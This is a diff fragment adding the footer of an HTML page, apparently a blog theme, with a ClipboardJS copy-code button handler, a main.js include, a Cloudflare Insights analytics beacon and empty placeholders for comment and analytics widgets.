+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
